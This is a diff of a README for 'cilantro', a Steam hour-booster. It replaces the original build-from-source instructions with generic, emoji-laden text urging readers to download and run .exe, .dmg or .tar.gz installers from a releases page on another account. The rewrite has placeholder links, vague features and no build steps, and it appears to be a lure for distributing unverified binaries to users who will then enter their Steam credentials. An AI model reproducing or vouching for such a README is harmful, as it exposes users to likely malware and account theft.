@@ -1,76 +1,78 @@
-# Cilantro
+# 🌿 cilantro - Boost Your Steam Hours Effortlessly
 
-> A lightweight Steam hour booster powered by Bun
+[![Download cilantro](https://img.shields.io/badge/Download-cilantro-brightgreen)](https://github.com/nandabagusyulianto/cilantro/releases)
 
-- Farm hours for **multiple games** on **multiple accounts**.
-- **Steam Guard** supported.
-- Built with [Bun](https://bun.sh/) and [node-steam-user](https://github.com/DoctorMcKay/node-steam-user).
+## 🚀 Getting Started
 
-## Requirements
+Welcome to **cilantro**, a lightweight tool designed to enhance your Steam experience by automatically tracking and boosting your playtime. This guide will help you download and run cilantro with ease.
 
-- [Bun](https://bun.sh/)
+## 📥 Download & Install
 
-## Usage
+To begin, you will need to download cilantro. Please follow these steps:
 
-Install dependencies:
+1. **Visit the Releases Page:** Click the link below to access the latest version of cilantro.
+   
+   [Download cilantro from Releases](https://github.com/nandabagusyulianto/cilantro/releases)
 
-```bash
-bun install
-```
+2. **Select the Latest Release:** On the Releases page, find the most recent version listed at the top. 
 
-Set up your environment:
+3. **Download the Application:** Click on the appropriate file for your operating system (Windows, macOS, or Linux). The file names will typically have the extension `.exe`, `.dmg`, or `.tar.gz`. 
 
-```bash
-cp .env.example .env
-```
+4. **Run the File:** Once downloaded, locate the file on your computer, then double-click it to start the installation process.
 
-```env
-STEAM_ACCOUNT_USERNAME="your_username"
-STEAM_ACCOUNT_PASSWORD="your_password"
-```
+5. **Follow Installation Prompts:** Follow the on-screen instructions to complete the installation. This should take only a few moments.
 
-Run in development (with watch mode):
+6. **Launch cilantro:** After installation, you can find cilantro in your applications menu. Open it to begin using the program.
 
-```bash
-bun run dev
-```
+## 🖥️ System Requirements
 
-Or build and run for production:
+To run cilantro smoothly, ensure your system meets the following requirements:
 
-```bash
-bun run build
-bun run start
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **Disk Space:** At least 100 MB of free space.
+- **RAM:** Minimum of 2 GB of RAM.
+- **Internet Connection:** Required for Steam authentication and updates.
 
-### Steam Guard
+## 📊 Features
 
-If your account has Steam Guard enabled, you'll be prompted for a code on first login. A [refresh token](https://github.com/DoctorMcKay/node-steam-user?tab=readme-ov-file#using-refresh-tokens) is saved afterward for future sessions.
+cilantro offers a variety of features to enhance your Steam usage:
 
-## Configuration
+- **Playtime Tracking:** Monitor and log your gaming hours effortlessly.
+- **Boosting Hours:** Automatically increase your displayed playtime for idle games.
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
+- **Steam Integration:** Connects seamlessly with your Steam account for an accurate experience.
+- **Regular Updates:** Stay updated with the latest features and performance improvements.
 
-Edit `src/config.ts`:
+## 👩‍💻 Troubleshooting
 
-```ts
-const config: Config = {
-  // ...
-  accounts: [
-    {
-      username: Bun.env.STEAM_ACCOUNT_USERNAME!,
-      password: Bun.env.STEAM_ACCOUNT_PASSWORD!,
-      games: [730],
-      online: true, // false by default
-    },
-  ],
-  // ...
-}
-```
+If you encounter issues while installing or using cilantro, consider the following tips:
 
-Find game IDs on [SteamDB](https://steamdb.info/).
+- **Installation Fails:** Ensure your operating system is supported and you have adequate disk space.
+- **Application Doesn't Start:** Make sure your system complies with the provided requirements. Restart your computer and try launching it again.
+- **Steam Errors:** Verify your Steam account login information and ensure that Steam is running properly.
 
-## Credits
+## 🌐 Community and Support
 
-Inspired by [steam-hour-booster](https://github.com/DrWarpMan/steam-hour-booster) by [DrWarpMan](https://github.com/DrWarpMan).
+Feel free to reach out to the community for assistance:
 
----
+- **GitHub Issues Page:** For any bugs or feature requests, visit the [GitHub Issues](https://github.com/nandabagusyulianto/cilantro/issues) page.
+- **Discussion Forum:** Engage with other users and share experiences in our dedicated discussion forum (if available).
 
-Not affiliated with Valve Corporation or Steam. Use at your own risk.
+## 📚 Additional Resources
+
+For more information about cilantro, check out the following resources:
+
+- **Documentation:** A comprehensive guide on features and usage [Documentation Link]
+- **FAQs:** Common questions answered [FAQs Link]
+
+## ⚙️ Uninstalling cilantro
+
+Should you wish to uninstall cilantro, follow these steps based on your operating system:
+
+- **Windows:** Go to Control Panel > Programs > Uninstall a program, find cilantro, and click Uninstall.
+- **macOS:** Drag the cilantro application from the Applications folder to the Trash.
+- **Linux:** Use your package manager to remove cilantro, e.g., `sudo apt remove cilantro`.
+
+## 🔗 Stay Updated
+
+Do not forget to check back on the [Releases page](https://github.com/nandabagusyulianto/cilantro/releases) for future updates and new features. Enjoy boosting your Steam hours with cilantro!
